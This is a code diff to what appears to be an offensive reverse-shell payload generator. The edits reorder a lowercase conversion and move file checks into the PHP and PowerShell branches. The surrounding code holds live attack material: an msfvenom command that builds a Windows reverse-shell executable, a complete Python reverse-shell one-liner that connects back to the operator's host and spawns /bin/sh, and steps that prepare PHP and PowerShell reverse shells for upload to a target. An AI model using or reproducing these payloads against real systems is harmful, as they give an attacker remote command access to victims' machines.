@@ -59,8 +59,8 @@ def Configure(IP = Get_IP(), PORT = str(args.port), payload = args.payload, msf 
     if payload.isnumeric():
         print(red('The payload must be a string.'))
         exit()
-    payload = payload.lower()
     msfvenom = 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=' + IP + ' LPORT=' + PORT + ' -f exe > autoreverse.exe 2>/dev/null'
+    payload = payload.lower()
     if msf == 1:
         msfvenom.replace('shell_', 'meterpreter/')
 
@@ -73,6 +73,7 @@ def Configure(IP = Get_IP(), PORT = str(args.port), payload = args.payload, msf 
     elif payload == 'python':
         print(blue('\nYour payload is:\n\n') + red("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IP + "\"," + PORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"))
     elif payload == 'php':
+        Check_files()
         os.system('cp /opt/autoreverse/autoreverse.php .')
         with open('autoreverse.php', 'r') as file:
             data = file.readlines()
@@ -82,6 +83,7 @@ def Configure(IP = Get_IP(), PORT = str(args.port), payload = args.payload, msf 
             file.writelines(data)
         print(blue(('Your payload ' + red('autoreverse.php') + blue(' is located in ') + red(os.popen('pwd').read().replace('\n', '')) + blue(' and ready to upload.\n'))))
     elif payload == 'powershell' or payload == 'ps1':
+        Check_files()
         os.system('cp /opt/autoreverse/autoreverse.ps1 .')
         os.system('echo "Invoke-PowerShellTcp -Reverse -IPAddress ' + IP + ' -Port ' + PORT + '" >> autoreverse.ps1')
         print(blue(('Your payload ' + red('autoreverse.ps1') + blue(' is located in ') + red(os.popen('pwd').read().replace('\n', '')) + blue(' and ready to upload.\n'))))
@@ -96,8 +98,6 @@ def Configure(IP = Get_IP(), PORT = str(args.port), payload = args.payload, msf 
     else:
         print(red('You payload option is not in the list, use "--help" to know the payloads list.'))
         exit()
-
-Check_files()
 
 if args.listener != None:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
